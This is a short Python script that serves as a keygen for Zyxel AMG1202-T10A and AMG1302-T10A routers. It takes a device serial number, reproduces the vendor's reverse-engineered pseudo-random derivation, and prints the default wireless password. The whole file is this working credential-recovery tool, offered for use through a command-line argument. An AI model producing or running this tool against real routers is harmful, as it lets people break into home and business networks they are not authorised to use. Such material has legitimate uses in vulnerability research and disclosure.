# keygen for the Zyxel AMG1202-T10A and AMG1302-T10A with a SSID of ZyXELddddlll
# Fantastic help by Selenium for getting the RasCode to run in Qiling, that allowed me to debug in IDA.


import hashlib
import argparse

def amg1302_t10a(sn):

	sn_byte_values = []
	sn = sn[1:]
	for i in range(0, 12, 2):
		sn_byte_values.append(int(sn[i:i+2], 16))
	sn_byte_values.append(ord('S'))

	input_bytes = sn_byte_values * 4
	seed = int("12345678", 16)
	pseudo_random = []

	for i in range(0, 20):
		xor_mask1 = seed & 255
		xor_mask2 = seed >> 5 & 255
		xor_mask3 = xor_mask1 ^ xor_mask2
		new_byte = input_bytes[i] ^ xor_mask3
		pseudo_random.append(new_byte)

		new_seed = seed >> 8
		seed_modifier = new_byte << 15
		seed = new_seed | seed_modifier

	digits = "".join([chr(48 + i % 10) for i in pseudo_random])
	letters = "".join([chr(97 + i % 26) for i in pseudo_random])

	ssid = "ZyXEL%s%s" % (digits[4:8], letters[3:6])
	password = letters[10:20]
	
	print(password)


parser = argparse.ArgumentParser(description='Keygen for the Zyxel AMG1202-T10A and AMG1302-T10A with a SSID of ZyXELddddlll')
parser.add_argument('serial', help='Serial number')
args = parser.parse_args()

amg1302_t10a(args.serial)